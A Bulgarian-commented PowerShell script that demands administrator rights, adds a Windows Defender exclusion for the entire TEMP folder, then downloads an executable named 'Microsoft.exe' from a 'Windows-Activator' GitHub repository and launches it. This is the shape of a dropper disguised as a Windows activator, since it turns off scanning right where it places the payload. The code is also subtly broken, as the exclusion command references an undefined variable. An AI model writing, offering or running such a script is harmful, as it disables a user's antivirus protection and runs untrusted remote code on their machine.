# ============================================
# ПЪЛЕН СКРИПТ ЗА ДОБАВЯНЕ НА ИЗКЛЮЧЕНИЕ В DEFENDER
# ============================================

# 1. ПРОВЕРКА ЗА АДМИНИСТРАТОРСКИ ПРАВА
# Задължително е, за да се добави изключение!
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ГРЕШКА: Скриптът трябва да се пусне като Администратор!" -ForegroundColor Red
    Write-Host "Моля, затворейте PowerShell и го отворете отново 'Като администратор'." -ForegroundColor Yellow
    pause
    exit
}

# 2. ДЕФИНИРАНЕ НА ПЪТИЩАТА
$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
$tempFile = "$env:TEMP\Microsoft.exe"
$folderToExclude = "$env:TEMP"  # Папка за изключение

# 3. ДОБАВЯНЕ НА ИЗКЛЮЧЕНИЕ В WINDOWS DEFENDER
Write-Host "Добавяне на изключение за Defender за папка: $folderToExclude" -ForegroundColor Cyan
try {
    # Команда за добавяне на изключение
    Add-MpPreference -ExclusionPath $folderToInclude -ErrorAction Stop
    Write-Host "УСПЕХ: Изключението е добавено!" -ForegroundColor Green
    
    # Показване на всички текущи изключения (за проверка)
    Write-Host "`nТекущи изключения в Defender:" -ForegroundColor Yellow
    Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
}
catch {
    Write-Host "ГРЕШКА при добавяне на изключение: $_" -ForegroundColor Red
    Write-Host "Възможни причини:" -ForegroundColor Yellow
    Write-Host "1. Defender службата не е активна"
    Write-Host "2. Грешка в политиките на групата"
    Write-Host "3. Антивирусна програма на трета страна блокира операцията"
    pause
    exit
}

# 4. СВАЛЯНЕ НА ФАЙЛА
Write-Host "`nСваляне на файл от: $url" -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
    Write-Host "УСПЕХ: Файлът е свалени успешно в: $tempFile" -ForegroundColor Green
}
catch {
    Write-Host "ГРЕШКА при сваляне на файла: $_" -ForegroundColor Red
    Write-Host "Моля, проверете интернет връзката или URL адреса." -ForegroundColor Yellow
    pause
    exit
}

# 5. ПУСКАНЕ НА ФАЙЛА
Write-Host "`nСтартиране на файла: $tempFile" -ForegroundColor Cyan
try {
    Start-Process $tempFile
    Write-Host "Файлът е стартиран успешно." -ForegroundColor Green
}
catch {
    Write-Host "ГРЕШКА при стартиране на файла: $_" -ForegroundColor Red
    Write-Host "Възможни причини:" -ForegroundColor Yellow
    Write-Host "1. Файлът е повреден"
    Write-Host "2. Липсват права за изпълнение"
    Write-Host "3. Друг антивирус блокира изпълнението"
}

# 6. ДОПЪЛНИТЕЛНА ИНФОРМАЦИЯ
Write-Host "`n==============================================" -ForegroundColor Gray
Write-Host "ВАЖНА ИНФОРМАЦИЯ:" -ForegroundColor Yellow
Write-Host "1. Изключението е за цялата папка TEMP: $env:TEMP"
Write-Host "2. Всички файлове в тази папка НЯМА да се сканират за вируси!"
Write-Host "3. За да премахнете изключението по-късно, изпълнете:" -ForegroundColor Cyan
Write-Host "   Remove-MpPreference -ExclusionPath `"$env:TEMP`""
Write-Host "==============================================" -ForegroundColor Gray

pause
